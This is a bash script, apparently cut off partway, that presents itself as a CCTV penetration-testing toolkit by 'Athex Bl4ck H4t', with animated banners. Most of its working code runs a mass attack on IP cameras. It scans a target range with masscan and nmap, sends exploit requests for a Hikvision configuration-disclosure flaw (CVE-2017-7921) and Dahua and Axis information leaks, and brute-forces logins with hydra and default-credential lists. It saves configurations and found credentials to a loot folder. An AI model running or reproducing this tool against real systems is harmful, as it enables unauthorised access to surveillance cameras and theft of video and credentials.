#!/bin/bash
#
# AutoCCTVPenTest Toolkit - Ultimate CCTV Security Assessment
# Educational Purpose Only - Use Responsibly
# Created by: Athex Bl4ck H4t - Pakistani Cyber Security Researcher
# Web Developer | Security Expert | Dark Web Researcher
# Version: 4.0 - Ultimate Edition with Animations


# Colors for animations
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
ORANGE='\033[0;33m'
WHITE='\033[1;37m'
BLACK='\033[0;30m'
NC='\033[0m' # No Color

# Background colors
BG_RED='\033[41m'
BG_GREEN='\033[42m'
BG_YELLOW='\033[43m'
BG_BLUE='\033[44m'
BG_PURPLE='\033[45m'
BG_CYAN='\033[46m'
BG_WHITE='\033[47m'

# Bold colors
BOLD_RED='\033[1;31m'
BOLD_GREEN='\033[1;32m'
BOLD_YELLOW='\033[1;33m'
BOLD_BLUE='\033[1;34m'
BOLD_PURPLE='\033[1;35m'
BOLD_CYAN='\033[1;36m'
BOLD_WHITE='\033[1;37m'

# Global variables
TARGET=""
TARGET_FILE=""
OUTPUT_DIR="$(pwd)/cctv_pentest_$(date +%Y%m%d_%H%M%S)"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
THREADS=10  # Reduced from 50 to prevent system overload
TIMEOUT=5
CCTV_PORTS="80,81,82,83,84,85,86,87,88,89,443,554,5554,8554,8080,8081,8082,8083,8088,8090,8443,37777,37778"
RTSP_PORTS="554,5554,8554,10554"
SCAN_DELAY=0.1
PARALLEL_SCANS=10  # Reduced from 20 to prevent system overload

# ============================================================================= #
# ANIMATION FUNCTIONS - Added by Athex                                          #
# ============================================================================= #

# Animation 1: Athex Personal Introduction Banner
athex_introduction() {
    clear
    echo -e "${BOLD_CYAN}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║   █████╗ ████████╗██╗  ██╗███████╗██╗  ██╗                   ║
    ║  ██╔══██╗╚══██╔══╝██║  ██║██╔════╝╚██╗██╔╝                   ║
    ║  ███████║   ██║   ███████║█████╗   ╚███╔╝                    ║
    ║  ██╔══██║   ██║   ██╔══██║██╔══╝   ██╔██╗                    ║
    ║  ██║  ██║   ██║   ██║  ██║███████╗██╔╝ ██╗                   ║
    ║  ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  BL4CK H4T        ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${BOLD_YELLOW}"
    cat << "EOF"
          Pakistani Cyber Security Researcher & Developer
    ═══════════════════════════════════════════════════════════════
EOF
    echo -e "${BOLD_GREEN}"
    cat << "EOF"
    🔐 Web Application Security    🔓 Vulnerability Research
    🌐 Dark Web Intelligence       🔧 Tool Development
    📡 Network Penetration Testing 🛡️ Security Consulting
    💻 Full Stack Development      🔍 Digital Forensics
EOF
    echo -e "${BOLD_BLUE}"
    cat << "EOF"
    ═══════════════════════════════════════════════════════════════
         "Securing the Digital World, One Line at a Time"
EOF
    echo -e "${NC}"
    sleep 2
}

# Animation 2: Ultimate CCTV Toolkit Banner
ultimate_cctv_banner() {
    clear
    echo -e "${BOLD_RED}"
    cat << "EOF"
    ╔═══════════════════════════════════════════════════════════════════════════════════════════════╗
    ║                                                                                               ║
    ║   ██╗   ██╗██╗ ██████╗ ██╗██╗      █████╗ ███╗   ██╗████████╗    ███████╗██╗   ██╗███████╗    ║
    ║   ██║   ██║██║██╔════╝ ██║██║     ██╔══██╗████╗  ██║╚══██╔══╝    ██╔════╝╚██╗ ██╔╝██╔════╝    ║
    ║   ██║   ██║██║██║  ███╗██║██║     ███████║██╔██╗ ██║   ██║       █████╗   ╚████╔╝ █████╗      ║
    ║   ╚██╗ ██╔╝██║██║   ██║██║██║     ██╔══██║██║╚██╗██║   ██║       ██╔══╝    ╚██╔╝  ██╔══╝      ║
    ║    ╚████╔╝ ██║╚██████╔╝██║███████╗██║  ██║██║ ╚████║   ██║       ███████╗   ██║   ███████╗    ║
    ║     ╚═══╝  ╚═╝ ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝       ╚══════╝   ╚═╝   ╚══════╝    ║
    ║                                                                                               ║ 
    ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${BOLD_CYAN}"
    cat << "EOF"
           ULTIMATE CCTV EXPLOITATION FRAMEWORK v4.0
    ═══════════════════════════════════════════════════════════════
EOF
    echo -e "${BOLD_YELLOW}"
    cat << "EOF"
    🔍 Network Discovery      🔓 Vulnerability Assessment
    🔑 Credential Attacks     📹 Stream Exploitation
    ⚡ Mass Exploitation      📊 Advanced Reporting
    🛡️  Defense Evasion       🔧 Custom Exploitation
EOF
    echo -e "${BOLD_GREEN}"
    cat << "EOF"
    ═══════════════════════════════════════════════════════════════
         Created by ATHEX - Pakistani Security Researcher
EOF
    echo -e "${NC}"
}

# Animation 3: Matrix Digital Rain
matrix_digital_rain() {
    echo -e "${GREEN}"
    clear
    lines=$(tput lines)
    cols=$(tput cols)
    
    for ((i=1; i<=lines; i++)); do
        for ((j=1; j<=cols; j++)); do
            if [ $((RANDOM % 2)) -eq 0 ]; then
                printf "0"
            else
                printf "1"
            fi
        done
        printf "\n"
    done
    sleep 1
    echo -e "${NC}"
    clear
}

# Animation 4: CCTV Camera Sweep
cctv_camera_sweep() {
    clear
    positions=("|" "/" "-" "\\")
    
    for i in {1..5}; do
        for pos in "${positions[@]}"; do
            echo -e "${CYAN}"
            cat << EOF
    +-------------------------------+
    |      CCTV CAMERA ACTIVE       |
    |                               |
    |           $pos                |
    |                               |
    |    Scanning Network...        |
    +-------------------------------+
EOF
            sleep 0.1
            clear
        done
    done
}

# Animation 5: Progress Spinner with Message
progress_spinner() {
    local message=$1
    local spin='⣷⣯⣟⡿⢿⣻⣽⣾'
    local charwidth=3
    
    echo -n -e "${CYAN}$message ${NC}"
    
    for i in {1..10}; do
        for i in {0..7}; do
            echo -n -e "${BOLD_CYAN}${spin:$i:$charwidth}${NC}"
            sleep 0.1
            echo -ne "\b\b\b"
        done
    done
    
    echo -e "${GREEN}✓ Done${NC}"
}

# Animation 6: Explosion Effect
explosion_effect() {
    clear
    echo -e "${RED}"
    for i in {1..3}; do
        cat << "EOF"
    💥   💥   💥
      💥 💥 💥  
    💥 💥 💥 💥 💥
      💥 💥 💥  
    💥   💥   💥
EOF
        sleep 0.1
        clear
        cat << "EOF"
    ✨   ✨   ✨
      ✨ ✨ ✨  
    ✨ ✨ ✨ ✨ ✨
      ✨ ✨ ✨  
    ✨   ✨   ✨
EOF
        sleep 0.1
        clear
    done
    echo -e "${NC}"
}

# Animation 7: Typewriter Effect
typewriter_effect() {
    local text=$1
    local color=$2
    
    echo -ne "$color"
    for ((i=0; i<${#text}; i++)); do
        printf "%s" "${text:$i:1}"
        sleep 0.03
    done
    echo -e "${NC}"
}

# Animation 8: Security Shield
security_shield() {
    clear
    echo -e "${GREEN}"
    for i in {1..3}; do
        cat << "EOF"
          ██████
        ██      ██
      ██    🔒    ██
      ██          ██
        ██      ██
          ██████
    Security Active
EOF
        sleep 0.3
        clear
        echo -e "${BLUE}"
        cat << "EOF"
          ██████
        ██      ██
      ██    🛡️    ██
      ██          ██
        ██      ██
          ██████
    Protection Enabled
EOF
        sleep 0.3
        clear
    done
}

# Animation 9: Hacking Terminal Simulation
hacking_terminal_simulation() {
    echo -e "${GREEN}"
    messages=(
        "Initializing CCTV Exploitation Framework..."
        "Bypassing Security Protocols..."
        "Accessing Camera Networks..."
        "Decrypting Video Streams..."
        "Extracting Configuration Data..."
        "Establishing Backdoor Access..."
    )
    
    for message in "${messages[@]}"; do
        for ((i=0; i<${#message}; i++)); do
            printf "%s" "${message:$i:1}"
            sleep 0.05
        done
        printf "\n"
        sleep 0.3
    done
    echo -e "${NC}"
}

# Animation 10: Network Nodes Animation
network_nodes_animation() {
    clear
    echo -e "${GREEN}"
    cat << EOF
        ○───○───○
        │   │   │
        ○───◎───○
        │   │   │
        ○───○───○
    Network Nodes: Active
EOF
    sleep 0.5
    clear
    echo -e "${CYAN}"
    cat << EOF
        ◎───○───◎
        │   │   │
        ○───●───○
        │   │   │
        ◎───○───◎
    Network Nodes: Scanning
EOF
    sleep 0.5
}

# Animation 11: Progress Bar
progress_bar() {
    local duration=$1
    local increment=$((duration / 50))
    for ((i=0; i<=50; i++)); do
        printf "\r[${GREEN}"
        for ((j=0; j<i; j++)); do printf "█"; done
        for ((j=i; j<50; j++)); do printf "▒"; done
        printf "${NC}] %d%%" $((i * 2))
        sleep $increment
    done
    printf "\n"
}

# Animation 12: Spinner
spinner() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid 2>/dev/null)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# =============================================================================
# MAIN TOOL FUNCTIONS
# =============================================================================

# Enhanced dependency check
check_dependencies() {
    echo -e "${YELLOW}[SYSTEM] Checking dependencies...${NC}"
    
    local tools=("nmap" "curl" "ffmpeg" "medusa" "hydra" "sqlmap" "nikto" 
                 "whatweb" "dirb" "gobuster" "python3" "ffplay" "openssl" 
                 "john" "crunch" "parallel" "masscan" "git" "wget")
    
    local missing=()
    
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing+=("$tool")
            echo -e "${RED}[MISSING] $tool${NC}"
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${YELLOW}[INSTALL] Installing missing dependencies...${NC}"
        apt update &> /dev/null
        
        for tool in "${missing[@]}"; do
            echo -e "${BLUE}[INSTALLING] $tool${NC}"
            apt install -y "$tool" &> /dev/null &
            local pid=$!
            spinner $pid
            wait $pid
        done
    fi
    
    # Check Python modules
    local python_modules=("requests" "urllib3" "colorama" "bs4")
    
    for module in "${python_modules[@]}"; do
        if ! python3 -c "import $module" &> /dev/null; then
            echo -e "${YELLOW}[PYTHON] Installing $module${NC}"
            pip3 install "$module" &> /dev/null &
            local pid=$!
            spinner $pid
            wait $pid
        fi
    done
    
    # Install additional tools
    install_additional_tools
    
    echo -e "${GREEN}[SUCCESS] All dependencies satisfied${NC}"
}

# Install additional CCTV-specific tools
install_additional_tools() {
    echo -e "${YELLOW}[SYSTEM] Installing advanced CCTV tools...${NC}"
    
    # Install rtsp-auth-check if not present
    if ! command -v rtsp-auth-check &> /dev/null; then
        if git clone https://github.com/0x90/rtsp-auth-check.git /tmp/rtsp-auth-check &> /dev/null; then
            cp /tmp/rtsp-auth-check/rtsp-auth-check /usr/local/bin/ &> /dev/null
            chmod +x /usr/local/bin/rtsp-auth-check
        fi
    fi
    
    # Install CCTV-exploits database
    if [ ! -d "/opt/cctv-exploits" ]; then
        git clone https://github.com/vanhauser-thc/cctv-exploits /opt/cctv-exploits &> /dev/null
    fi
}

# Enhanced environment setup
setup_environment() {
    echo -e "${YELLOW}[SYSTEM] Setting up environment...${NC}"
    
    mkdir -p "$OUTPUT_DIR"/{recon,exploits,credentials,streams,reports,logs,loot}
    
    # Create advanced wordlists
    create_advanced_wordlists
    
    # Setup logging
    exec > >(tee "$OUTPUT_DIR/logs/main.log") 2>&1
    
    echo -e "${GREEN}[SUCCESS] Environment setup complete${NC}"
    echo -e "${BLUE}[INFO] Output structure created in: $OUTPUT_DIR${NC}"
}

# Create advanced wordlists
create_advanced_wordlists() {
    echo -e "${YELLOW}[WORDLIST] Generating advanced wordlists...${NC}"
    
    # Extended user list
    cat > "$OUTPUT_DIR/cctv_users.txt" << EOF
admin
administrator
root
user
guest
supervisor
operator
service
default
support
tech
cctv
security
demo
test
manager
viewer
monitor
888888
666666
111111
1234
12345
123456
EOF

    # Extended password list
    cat > "$OUTPUT_DIR/cctv_passwords.txt" << EOF
admin
1234
12345
123456
password
pass
12345678
123456789
888888
666666
111111
admin123
admin1234
password123
secret
1234567890
123
000000
1111
4321
54321
1234567
12345678910
qwerty
abc123
pass123
admin@123
Admin@123
P@ssw0rd
P@ssword123
EOF

    # Advanced path list
    cat > "$OUTPUT_DIR/cctv_paths.txt" << EOF
/
/admin
/console
/login
/view
/video
/stream
/cgi-bin
/cgi
/web
/webadmin
/operator
/user
/guest
/live
/media
/video.mp4
/axis-cgi/mjpg/video.cgi
/axis-cgi/jpg/image.cgi
/cgi-bin/snapshot.cgi
/img/snapshot.cgi
/cgi-bin/viewer/video.jpg
/videostream.cgi
/snapshot.cgi
/record/current.jpg
/jpg/image.jpg
/jpeg/image.jpg
/image.jpg
/api
/rest
/json
/xml
/config
/system
/status
/info
/version
/debug
/test
EOF

    # Extended RTSP URLs
    cat > "$OUTPUT_DIR/rtsp_urls.txt" << EOF
/stream1
/stream2
/main
/live
/video
/av0
/av1
/ch0
/ch1
/ch01
/ch02
/cam0
/cam1
/cam01
/cam02
/h264
/mjpeg
/h265
/11
/12
/1
/2
/axis-media/media.amp
/medias2
/mpeg4
/media
/media1
/media2
/ipcam
/ipcamera
/camera
/camera1
/camera2
EOF

    echo -e "${GREEN}[SUCCESS] Advanced wordlists created${NC}"
}

# Cool Main Menu with Enhanced Animations
show_main_menu() {
    while true; do
        clear
        ultimate_cctv_banner
        
        echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║                       MAIN MENU                               ║${NC}"
        echo -e "${CYAN}╠═══════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${CYAN}║${NC} ${GREEN}1.${NC} Full Automated CCTV Assessment                 ${CYAN}║${NC}"
        echo -e "${CYAN}║${NC} ${GREEN}2.${NC} Ultra Fast Network Discovery                   ${CYAN}║${NC}"
        echo -e "${CYAN}║${NC} ${GREEN}3.${NC} Advanced Vulnerability Scanner                 ${CYAN}║${NC}"
        echo -e "${CYAN}║${NC} ${GREEN}4.${NC} Mass Credential Attack                         ${CYAN}║${NC}"
        echo -e "${CYAN}║${NC} ${GREEN}5.${NC} RTSP Stream Hunter                             ${CYAN}║${NC}"
        echo -e "${CYAN}║${NC} ${GREEN}6.${NC} Live Stream Capture & Recording                ${CYAN}║${NC}"
        echo -e "${CYAN}║${NC} ${GREEN}7.${NC} Configuration & Data Extraction                ${CYAN}║${NC}"
        echo -e "${CYAN}║${NC} ${GREEN}8.${NC} Custom Target Scan                             ${CYAN}║${NC}"
        echo -e "${CYAN}║${NC} ${GREEN}9.${NC} Generate Professional Report                   ${CYAN}║${NC}"
        echo -e "${CYAN}║${NC} ${GREEN}10.${NC} Show Animations Demo                          ${CYAN}║${NC}"
        echo -e "${CYAN}║${NC} ${RED}0.${NC} Exit                                             ${CYAN}║${NC}"
        echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${YELLOW}Select an option [0-10]: ${NC}"
        read -r option
        echo ""

        case $option in
            1) full_automated_assessment ;;
            2) ultra_fast_discovery ;;
            3) advanced_vulnerability_scanner ;;
            4) mass_credential_attack ;;
            5) rtsp_stream_hunter ;;
            6) live_stream_capture ;;
            7) configuration_extraction ;;
            8) custom_target_scan ;;
            9) generate_professional_report ;;
            10) show_animations_demo ;;
            0) exit_script ;;
            *) echo -e "${RED}[ERROR] Invalid option!${NC}"; sleep 1 ;;
        esac
        
        echo ""
        echo -e "${YELLOW}Press any key to continue...${NC}"
        read -n 1 -r
    done
}

# Animations Demo Menu
show_animations_demo() {
    while true; do
        clear
        echo -e "${BOLD_CYAN}"
        cat << "EOF"
    ╔══════════════════════════════════════════════════════════════╗
    ║                 ATHEX ANIMATION COLLECTION                  ║
    ║              Choose an Animation to Display                 ║
    ╚══════════════════════════════════════════════════════════════╝
EOF
        echo -e "${BOLD_WHITE}"
        echo "1.  Athex Introduction           7.  Typewriter Effect"
        echo "2.  CCTV Toolkit Banner          8.  Security Shield"
        echo "3.  Matrix Digital Rain          9.  Hacking Terminal"
        echo "4.  CCTV Camera Sweep           10.  Network Nodes"
        echo "5.  Progress Spinner            11.  Explosion Effect"
        echo "6.  Progress Bar                12.  Demo All Animations"
        echo "0.  Back to Main Menu"
        echo ""
        echo -e "${BOLD_YELLOW}Select an animation [0-12]: ${NC}"
        read -r choice
        
        case $choice in
            1) athex_introduction ;;
            2) ultimate_cctv_banner ;;
            3) matrix_digital_rain ;;
            4) cctv_camera_sweep ;;
            5) sleep 3 &; progress_spinner "Testing Animation" ;;
            6) progress_bar 5 ;;
            7) typewriter_effect "Athex CCTV Pentest Framework" "$BOLD_PURPLE" ;;
            8) security_shield ;;
            9) hacking_terminal_simulation ;;
            10) network_nodes_animation ;;
            11) explosion_effect ;;
            12) demo_all_animations ;;
            0) return ;;
            *) echo -e "${RED}Invalid selection!${NC}"; sleep 1 ;;
        esac
        
        echo ""
        echo -e "${YELLOW}Press any key to continue...${NC}"
        read -n 1 -r
    done
}

# Demo all animations
demo_all_animations() {
    echo -e "${BOLD_WHITE}Starting Athex Animation Collection Demo...${NC}"
    sleep 2
    
    athex_introduction
    sleep 1
    
    ultimate_cctv_banner
    sleep 1
    
    echo -e "${BOLD_YELLOW}[1/8] Matrix Digital Rain${NC}"
    matrix_digital_rain
    sleep 1
    
    echo -e "${BOLD_YELLOW}[2/8] CCTV Camera Sweep${NC}"
    cctv_camera_sweep
    sleep 1
    
    echo -e "${BOLD_YELLOW}[3/8] Hacking Terminal${NC}"
    hacking_terminal_simulation
    sleep 1
    
    echo -e "${BOLD_YELLOW}[4/8] Network Nodes${NC}"
    network_nodes_animation
    sleep 1
    
    echo -e "${BOLD_YELLOW}[5/8] Progress Spinner${NC}"
    sleep 3 &
    progress_spinner "Loading Security Modules"
    sleep 1
    
    echo -e "${BOLD_YELLOW}[6/8] Explosion Effect${NC}"
    explosion_effect
    sleep 1
    
    echo -e "${BOLD_YELLOW}[7/8] Typewriter Effect${NC}"
    typewriter_effect "Welcome to Athex Security Framework" "$BOLD_CYAN"
    sleep 1
    
    echo -e "${BOLD_YELLOW}[8/8] Security Shield${NC}"
    security_shield
    sleep 1
    
    echo -e "${BOLD_GREEN}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════╗
    ║                   ANIMATION DEMO COMPLETE!                   ║
    ║     Use these animations to make your tools look awesome!    ║
    ╚══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Ultra Fast Network Discovery with Animations
ultra_fast_discovery() {
    echo -e "${CYAN}[PHASE 1] ULTRA FAST NETWORK DISCOVERY${NC}"
    
    get_target
    
    # Show network nodes animation
    network_nodes_animation
    
    echo -e "${YELLOW}[SCANNING] Running masscan for ultra-fast port discovery...${NC}"
    
    # Use masscan for ultra-fast scanning
    if command -v masscan &> /dev/null; then
        masscan -p$CCTV_PORTS --rate=1000 "$TARGET" -oG "$OUTPUT_DIR/recon/masscan_scan.txt" &> /dev/null &
        local masscan_pid=$!
        progress_spinner "Masscan Port Discovery"
        wait $masscan_pid
    else
        echo -e "${YELLOW}[INFO] Masscan not found, using nmap instead...${NC}"
        nmap -p $CCTV_PORTS --open -T4 "$TARGET" -oG "$OUTPUT_DIR/recon/masscan_scan.txt" &> /dev/null
    fi
    
    # Extract live hosts
    if [ -f "$OUTPUT_DIR/recon/masscan_scan.txt" ]; then
        grep -E "Ports:" "$OUTPUT_DIR/recon/masscan_scan.txt" | awk '{print $2}' | sort -u > "$OUTPUT_DIR/recon/live_hosts.txt"
    else
        touch "$OUTPUT_DIR/recon/live_hosts.txt"
    fi
    
    local host_count=$(wc -l < "$OUTPUT_DIR/recon/live_hosts.txt" 2>/dev/null || echo 0)
    
    if [ "$host_count" -gt 0 ]; then
        echo -e "${GREEN}[SUCCESS] Found $host_count potential CCTV systems${NC}"
        explosion_effect
        
        # Parallel service detection
        echo -e "${YELLOW}[SERVICE DETECTION] Running parallel service fingerprinting...${NC}"
        
        # Use parallel for concurrent scanning
        if command -v parallel &> /dev/null && [ -s "$OUTPUT_DIR/recon/live_hosts.txt" ]; then
            cat "$OUTPUT_DIR/recon/live_hosts.txt" | parallel -j $PARALLEL_SCANS "
            echo -e \"${BLUE}[SCANNING] {}$NC\";
            nmap -sS -sV -p $CCTV_PORTS --script=http-title,http-headers {} -oN \"$OUTPUT_DIR/recon/service_scan_{}.txt\" &> /dev/null
            " &
            local parallel_pid=$!
            progress_spinner "Service Fingerprinting"
            wait $parallel_pid
        else
            echo -e "${YELLOW}[INFO] Parallel not available, running sequential scans...${NC}"
            while IFS= read -r host; do
                echo -e "${BLUE}[SCANNING] $host${NC}"
                nmap -sS -sV -p $CCTV_PORTS --script=http-title,http-headers "$host" -oN "$OUTPUT_DIR/recon/service_scan_$host.txt" &> /dev/null
            done < "$OUTPUT_DIR/recon/live_hosts.txt"
        fi
        
        # Web interface discovery
        discover_web_interfaces_fast
    else
        echo -e "${RED}[WARNING] No CCTV systems found on target network${NC}"
    fi
}

# Fast web interface discovery
discover_web_interfaces_fast() {
    echo -e "${YELLOW}[WEB DISCOVERY] Fast web interface discovery...${NC}"
    
    # Show CCTV camera animation during discovery
    cctv_camera_sweep &
    local camera_pid=$!
    
    # Use parallel for fast HTTP checks
    if command -v parallel &> /dev/null && [ -s "$OUTPUT_DIR/recon/live_hosts.txt" ]; then
        cat "$OUTPUT_DIR/recon/live_hosts.txt" | parallel -j $PARALLEL_SCANS "
        for port in 80 81 82 83 84 85 86 87 88 89 443 8080 8081 8082 8083 8088 8090 8443; do
            if timeout 2 curl -s -I \"http://{}:\$port/\" &> /dev/null; then
                echo \"{}:\$port\" >> \"$OUTPUT_DIR/recon/web_hosts.txt\"
                title=\$(timeout 5 curl -s \"http://{}:\$port/\" | grep -i '<title>' | sed 's/<title>\\(.*\\)<\\/title>/\\1/I' | head -1)
                echo \"{}:\$port:\$title\" >> \"$OUTPUT_DIR/recon/web_titles.txt\"
            fi
        done
        " &
        local web_pid=$!
        progress_spinner "Web Interface Discovery"
        wait $web_pid
    else
        echo -e "${YELLOW}[INFO] Parallel not available, running sequential checks...${NC}"
        while IFS= read -r host; do
            for port in 80 81 82 83 84 85 86 87 88 89 443 8080 8081 8082 8083 8088 8090 8443; do
                if timeout 2 curl -s -I "http://$host:$port/" &> /dev/null; then
                    echo "$host:$port" >> "$OUTPUT_DIR/recon/web_hosts.txt"
                    title=$(timeout 5 curl -s "http://$host:$port/" | grep -i '<title>' | sed 's/<title>\(.*\)<\/title>/\1/I' | head -1)
                    echo "$host:$port:$title" >> "$OUTPUT_DIR/recon/web_titles.txt"
                fi
            done
        done < "$OUTPUT_DIR/recon/live_hosts.txt"
    fi
    
    kill $camera_pid 2>/dev/null
    
    local web_count=0
    if [ -f "$OUTPUT_DIR/recon/web_hosts.txt" ]; then
        web_count=$(wc -l < "$OUTPUT_DIR/recon/web_hosts.txt")
    fi
    echo -e "${GREEN}[SUCCESS] Found $web_count web interfaces${NC}"
}

# Advanced Vulnerability Scanner with Animations
advanced_vulnerability_scanner() {
    echo -e "${CYAN}[PHASE 2] ADVANCED VULNERABILITY SCANNING${NC}"
    
    if [ ! -f "$OUTPUT_DIR/recon/web_hosts.txt" ] || [ ! -s "$OUTPUT_DIR/recon/web_hosts.txt" ]; then
        echo -e "${RED}[ERROR] No web hosts found. Run discovery first.${NC}"
        return
    fi
    
    # Show hacking terminal animation
    hacking_terminal_simulation
    
    echo -e "${YELLOW}[VULN SCAN] Scanning for CCTV vulnerabilities...${NC}"
    
    # Parallel vulnerability scanning
    if command -v parallel &> /dev/null; then
        cat "$OUTPUT_DIR/recon/web_hosts.txt" | parallel -j $PARALLEL_SCANS "
        host=\$(echo {} | cut -d: -f1)
        port=\$(echo {} | cut -d: -f2)
        
        # Check common vulnerabilities
        check_cctv_vulnerabilities_parallel \$host \$port
        
        # Nikto scan
        if command -v nikto &> /dev/null; then
            timeout 60 nikto -h \"http://{}:\$port/\" -output \"$OUTPUT_DIR/recon/nikto_\$host_\$port.txt\" -Format txt &> /dev/null
        fi
        
        # Directory scanning
        if command -v dirb &> /dev/null; then
            timeout 60 dirb \"http://{}:\$port/\" \"$OUTPUT_DIR/cctv_paths.txt\" -o \"$OUTPUT_DIR/recon/dirb_\$host_\$port.txt\" -S -r &> /dev/null
        fi
        " &
        local vuln_pid=$!
        progress_spinner "Vulnerability Scanning"
        wait $vuln_pid
    else
        echo -e "${YELLOW}[INFO] Parallel not available, running sequential scans...${NC}"
        while IFS= read -r web_host; do
            host=$(echo "$web_host" | cut -d: -f1)
            port=$(echo "$web_host" | cut -d: -f2)
            check_cctv_vulnerabilities_parallel "$host" "$port"
        done < "$OUTPUT_DIR/recon/web_hosts.txt"
    fi
    
    echo -e "${GREEN}[SUCCESS] Vulnerability scanning completed${NC}"
    security_shield
}

# Parallel vulnerability checking
check_cctv_vulnerabilities_parallel() {
    local host=$1
    local port=$2
    
    # Hikvision CVE-2017-7921
    if curl -s --connect-timeout 3 "http://$host:$port/System/configurationFile?auth=YWRtaW46MTEK" -o /tmp/config_test &> /dev/null; then
        if [ -s /tmp/config_test ]; then
            echo "CVE-2017-7921:Hikvision:Configuration disclosure:$host:$port" >> "$OUTPUT_DIR/exploits/vulnerabilities.txt"
            mv /tmp/config_test "$OUTPUT_DIR/exploits/hikvision_config_$host.xml" 2>/dev/null
        fi
    fi
    
    # Dahua information disclosure
    if curl -s --connect-timeout 3 "http://$host:$port/cgi-bin/magicBox.cgi?action=getSystemInfo" | grep -q "model"; then
        echo "CVE-2021-33044:Dahua:Information disclosure:$host:$port" >> "$OUTPUT_DIR/exploits/vulnerabilities.txt"
    fi
    
    # Axis VAPIX
    if curl -s --connect-timeout 3 "http://$host:$port/axis-cgi/admin/param.cgi?action=list" | grep -q "root"; then
        echo "VAPIX:Axis:Parameter exposure:$host:$port" >> "$OUTPUT_DIR/exploits/vulnerabilities.txt"
    fi
}

# Mass Credential Attack with Animations
mass_credential_attack() {
    echo -e "${CYAN}[PHASE 3] MASS CREDENTIAL ATTACK${NC}"
    
    if [ ! -f "$OUTPUT_DIR/recon/web_hosts.txt" ] || [ ! -s "$OUTPUT_DIR/recon/web_hosts.txt" ]; then
        echo -e "${RED}[ERROR] No web hosts found. Run discovery first.${NC}"
        return
    fi
    
    # Show matrix animation for credential attack
    matrix_digital_rain
    
    echo -e "${YELLOW}[CREDS] Starting mass credential attack...${NC}"
    
    # Create credentials file if it doesn't exist
    touch "$OUTPUT_DIR/credentials/found_credentials.txt"
    
    # Parallel credential attacks
    if command -v parallel &> /dev/null; then
        cat "$OUTPUT_DIR/recon/web_hosts.txt" | parallel -j $PARALLEL_SCANS "
        host=\$(echo {} | cut -d: -f1)
        port=\$(echo {} | cut -d: -f2)
        
        # Try default credentials
        check_default_credentials_fast \$host \$port
        
        # If no defaults found, try brute force
        if ! grep -q \"\$host:\$port\" \"$OUTPUT_DIR/credentials/found_credentials.txt\" 2>/dev/null; then
            if command -v hydra &> /dev/null; then
                timeout 120 hydra -L \"$OUTPUT_DIR/cctv_users.txt\" -P \"$OUTPUT_DIR/cctv_passwords.txt\" \
                    \"\$host\" http-get \"/\" -s \"\$port\" -t 2 -f -o \"$OUTPUT_DIR/credentials/hydra_\$host_\$port.txt\" &> /dev/null
            fi
        fi
        " &
        local cred_pid=$!
        progress_spinner "Credential Attack in Progress"
        wait $cred_pid
    else
        echo -e "${YELLOW}[INFO] Parallel not available, running sequential attacks...${NC}"
        while IFS= read -r web_host; do
            host=$(echo "$web_host" | cut -d: -f1)
            port=$(echo "$web_host" | cut -d: -f2)
            check_default_credentials_fast "$host" "$port"
        done < "$OUTPUT_DIR/recon/web_hosts.txt"
    fi
    
    # Parse results
    parse_credential_results
    
    local found_count=0
    if [ -f "$OUTPUT_DIR/credentials/found_credentials.txt" ]; then
        found_count=$(wc -l < "$OUTPUT_DIR/credentials/found_credentials.txt")
    fi
    
    if [ "$found_count" -gt 0 ]; then
        echo -e "${GREEN}[SUCCESS] Found $found_count valid credentials${NC}"
        explosion_effect
    else
        echo -e "${RED}[WARNING] No valid credentials found${NC}"
    fi
}

# Fast default credential check
check_default_credentials_fast() {
    local host=$1
    local port=$2
    
    # Common credentials array
    declare -A creds=(
        ["admin:admin"]="YWRtaW46YWRtaW4="
        ["admin:1234"]="YWRtaW46MTIzNA=="
        ["admin:12345"]="YWRtaW46MTIzNDU="
        ["admin:123456"]="YWRtaW46MTIzNDU2"
        ["admin:password"]="YWRtaW46cGFzc3dvcmQ="
        ["admin:"]="YWRtaW46"
        ["root:root"]="cm9vdDpyb290"
        ["admin:admin123"]="YWRtaW46YWRtaW4xMjM="
    )
    
    for cred in "${!creds[@]}"; do
        local user=$(echo "$cred" | cut -d: -f1)
        local pass=$(echo "$cred" | cut -d: -f2)
        local auth="${creds[$cred]}"
        
        if curl -s --connect-timeout 2 -H "Authorization: Basic $auth" "http://$host:$port/" | grep -q -i -E "(dashboard|admin|console|video|camera)"; then
            echo "$host:$port:$user:$pass" >> "$OUTPUT_DIR/credentials/found_credentials.txt"
            echo -e "${GREEN}[CREDS] Default found: $user:$pass on $host:$port${NC}"
            return 0
        fi
    done
    
    return 1
}

# Parse credential results
parse_credential_results() {
    for hydra_file in "$OUTPUT_DIR/credentials/hydra_"*.txt; do
        if [ -f "$hydra_file" ] && grep -q "login:" "$hydra_file"; then
            local host
            host=$(basename "$hydra_file" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
            local port
            port=$(basename "$hydra_file" | grep -oE '_[0-9]+_' | sed 's/_//g')
            local creds
            creds=$(grep "login:" "$hydra_file" | awk '{print $3":"$5}')
